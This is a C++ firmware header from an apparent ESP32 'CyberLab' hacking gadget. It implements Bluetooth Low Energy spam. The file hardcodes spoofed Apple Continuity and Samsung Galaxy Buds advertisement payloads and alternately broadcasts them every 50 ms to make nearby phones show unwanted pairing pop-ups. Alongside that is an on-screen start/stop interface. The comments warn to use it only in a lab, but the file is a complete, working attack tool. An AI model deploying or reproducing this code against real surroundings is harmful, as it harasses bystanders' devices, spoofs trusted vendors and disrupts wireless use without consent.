/*
 * ============================================================================
 * [NEV]² - NEV-OS CyberLab v3.0
 * module_ble_spam.h - BLE spam (Apple Continuity / Samsung Galaxy Buds popups)
 *
 * ATENCAO: Use apenas em ambiente controlado. Pode lotar redes BLE.
 * ============================================================================
 */
#pragma once

#include <Arduino.h>
#include <NimBLEDevice.h>
#include <TFT_eSPI.h>
#include "config.h"
#include "types.h"
#include "ui_helpers.h"

extern TFT_eSPI tft;
extern AppState currentState;
extern bool bleSpamActive;
extern int bleSpamCount;

// Apple Continuity "Nearby Action" payload (32 bytes)
// Source: public research; used by FlipperZero etc.
uint8_t applePayload[] = {
  0x02, 0x01, 0x06, 0x1A, 0xFF, 0x4C, 0x00, 0x07, 0x19,
  0x07, 0x0E, 0x20, 0x75, 0xAA, 0x30, 0x01, 0x00, 0x00,
  0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00
};

// Samsung Galaxy Buds payload (variant)
uint8_t samsungPayload[] = {
  0x02, 0x01, 0x06, 0x17, 0xFF, 0x75, 0xAA, 0x30, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

inline void drawBleSpamScreen() {
  tft.fillScreen(COLOR_BG);
  drawHeader("BLE Spam", true);

  drawPanel(20, 30, 280, 50);
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(30, 42);
  tft.print("Status:");
  tft.setTextColor(bleSpamActive ? COLOR_DANGER : COLOR_PRIMARY);
  tft.setCursor(80, 42);
  tft.print(bleSpamActive ? "SPAMMING" : "IDLE");

  drawPanel(20, 90, 280, 50);
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(30, 102);
  tft.printf("Packets: %d", bleSpamCount);

  // Action button
  int btnY = 160;
  tft.fillRoundRect(60, btnY, 200, 40, 8, bleSpamActive ? 0x4208 : COLOR_PANEL_BG);
  tft.drawRoundRect(60, btnY, 200, 40, 8, bleSpamActive ? COLOR_DANGER : COLOR_PRIMARY);
  drawCenteredText(bleSpamActive ? "PARAR" : "INICIAR SPAM", btnY + 14,
                   bleSpamActive ? COLOR_DANGER : COLOR_PRIMARY, 2);

  tft.setTextColor(COLOR_WARN);
  tft.setCursor(10, SCREEN_H - 28);
  tft.print("ATENCAO: use em lab!");
  drawStatusBar("Longo:toggle  BACK:sair");
}

inline void enterBleSpam() {
  currentState = STATE_BLE_SPAM;
  bleSpamActive = false;
  bleSpamCount = 0;
  drawBleSpamScreen();
}

inline void bleSpamLoop() {
  if (!bleSpamActive) return;
  // Alterna entre Apple e Samsung
  static bool flip = false;
  if (flip) {
    NimBLEAdvertising* adv = NimBLEDevice::getAdvertising();
    NimBLEAdvertisementData oAdvertisementData = NimBLEAdvertisementData();
    oAdvertisementData.addData(String((char*)applePayload, sizeof(applePayload)));
    adv->setAdvertisementData(oAdvertisementData);
    adv->start();
    delay(50);
    adv->stop();
  } else {
    NimBLEAdvertising* adv = NimBLEDevice::getAdvertising();
    NimBLEAdvertisementData oAdvertisementData = NimBLEAdvertisementData();
    oAdvertisementData.addData(String((char*)samsungPayload, sizeof(samsungPayload)));
    adv->setAdvertisementData(oAdvertisementData);
    adv->start();
    delay(50);
    adv->stop();
  }
  flip = !flip;
  bleSpamCount++;
  if (bleSpamCount % 10 == 0) drawBleSpamScreen();
}
